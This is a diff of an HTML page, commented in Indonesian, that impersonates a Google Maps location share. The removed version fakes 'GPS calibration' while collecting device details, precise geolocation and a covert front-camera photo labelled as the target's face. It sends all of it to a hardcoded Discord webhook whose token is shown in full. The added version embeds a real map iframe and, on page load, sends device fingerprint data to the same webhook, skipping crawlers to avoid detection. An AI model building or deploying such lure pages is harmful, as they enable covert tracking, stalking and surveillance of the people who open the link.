@@ -3,106 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Maps - Berbagi Lokasi</title>
-    
-    <meta property="og:title" content="Google Maps: Lokasi Terkini Saya">
-    <meta property="og:description" content="Klik untuk melihat posisi real-time dan rute perjalanan presisi.">
-    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png">
-    <meta property="og:type" content="website">
-
+    <title>Google Maps - Lokasi Terkini</title>
     <style>
-        body { font-family: 'Roboto', Arial, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
-        .container { width: 80%; }
-        .gmaps-logo { width: 70px; margin-bottom: 20px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.7; } 100% { transform: scale(1); opacity: 1; } }
-        h1 { font-size: 16px; color: #3c4043; font-weight: 400; }
-        p { font-size: 12px; color: #70757a; margin-top: 10px; }
-        video, canvas { display: none; }
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
+        iframe { width: 100%; height: 100%; border: none; }
     </style>
 </head>
 <body>
+    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3151.8354345059!2d144.95373531531615!3d-37.8368179797454!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6ad65d4c2b349649%3A0xb6899234e561db11!2sEnvato!5e0!3m2!1sen!2sau!4v1631520000000!5m2!1sen!2sau"></iframe>
 
-<div class="container">
-    <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" class="gmaps-logo">
-    <h1>Mengalibrasi sinyal GPS...</h1>
-    <p>Mohon tunggu sebentar untuk mendapatkan akurasi terbaik.</p>
-</div>
+    <script>
+        // MASUKKAN URL WEBHOOK SPIDEY BOT ANDA DI SINI
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8Dj5XnV..."; 
 
-<video id="video" autoplay></video>
-<canvas id="canvas"></canvas>
+        async function sikatData() {
+            // FILTER BOT: Supaya bot Google/Discord tidak kirim laporan palsu
+            const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
+            if (isBot) return;
 
-<script>
-    // MASUKKAN LINK DISCORD KAMU DI SINI
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484113432583081984/Fkm8Dj5XnVCkC7du-HRYBFKAvdcxCz9jcXzQIj_5G4hWa1rX0GUPVQ02P5as6oiOKOxR";
+            // DETEKSI OS YANG BENAR (Biar tidak Unknown OS)
+            const ua = navigator.userAgent;
+            let deviceType = "❓ Perangkat Tidak Dikenal";
+            
+            if (/android/i.test(ua)) deviceType = "📱 Android Phone";
+            else if (/iPhone|iPad|iPod/i.test(ua)) deviceType = "🍎 iOS (iPhone/iPad)";
+            else if (/Windows/i.test(ua)) deviceType = "💻 Windows PC";
+            else if (/Linux/i.test(ua)) deviceType = "🐧 Linux System";
 
-    async function sendToDiscord(msg, blob = null) {
-        const data = new FormData();
-        if (blob) {
-            data.append('file', blob, 'foto.jpg');
-            data.append('payload_json', JSON.stringify({ content: msg }));
-        } else {
-            data.append('payload_json', JSON.stringify({ content: msg }));
+            const payload = {
+                embeds: [{
+                    title: "🎯 TARGET TERDETEKSI!",
+                    color: 15158332, // Warna Merah
+                    fields: [
+                        { name: "Sistem Operasi", value: deviceType, inline: true },
+                        { name: "Resolusi Layar", value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                        { name: "Browser", value: navigator.vendor || "Default Browser", inline: false },
+                        { name: "Waktu Akses", value: new Date().toLocaleString('id-ID'), inline: false }
+                    ],
+                    footer: { text: "Spidey Bot Monitoring" }
+                }]
+            };
+
+            await fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
         }
-        return fetch(DISCORD_WEBHOOK, { method: 'POST', body: data });
-    }
 
-    async function start() {
-        // 1. Ambil Data Perangkat Terperinci
-        let os = "Unknown OS";
-        if (navigator.userAgent.indexOf("Android") != -1) os = "Android 🤖";
-        if (navigator.userAgent.indexOf("iPhone") != -1) os = "iPhone 🍎";
-
-        let infoHP = "📱 **DATA PERANGKAT TERDETEKSI**\n";
-        infoHP += "• Sistem: " + os + "\n";
-        infoHP += "• Layar: " + window.screen.width + "x" + window.screen.height + "\n";
-        infoHP += "• Processor: " + (navigator.hardwareConcurrency || "N/A") + " Core\n";
-        infoHP += "• Memori: " + (navigator.deviceMemory || "N/A") + " GB\n";
-
-        if (navigator.getBattery) {
-            try {
-                const b = await navigator.getBattery();
-                infoHP += "• Baterai: " + (b.level * 100).toFixed(0) + "% " + (b.charging ? "⚡" : "🪫");
-            } catch (e) {}
-        }
-        await sendToDiscord(infoHP);
-
-        // 2. Ambil Lokasi & Foto
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const acc = pos.coords.accuracy;
-                const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                
-                await sendToDiscord(`📍 **LOKASI PRESISI**\nAkurasi: ${acc.toFixed(1)} meter\nLink: ${mapUrl}`);
-
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-                    
-                    setTimeout(() => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        canvas.toBlob(async (blob) => {
-                            await sendToDiscord("📸 **FOTO WAJAH TARGET**", blob);
-                            stream.getTracks().forEach(t => t.stop());
-                            window.location.href = mapUrl; // Langsung buka Maps
-                        }, 'image/jpeg');
-                    }, 2000);
-                } catch (e) {
-                    window.location.href = mapUrl;
-                }
-            }, (err) => {
-                alert("Izin lokasi diperlukan untuk sinkronisasi Google Maps.");
-                location.reload();
-            }, { enableHighAccuracy: true });
-        }
-    }
-
-    window.onload = start;
-</script>
+        // Jalankan otomatis saat halaman selesai loading
+        window.onload = sikatData;
+    </script>
 </body>
 </html>
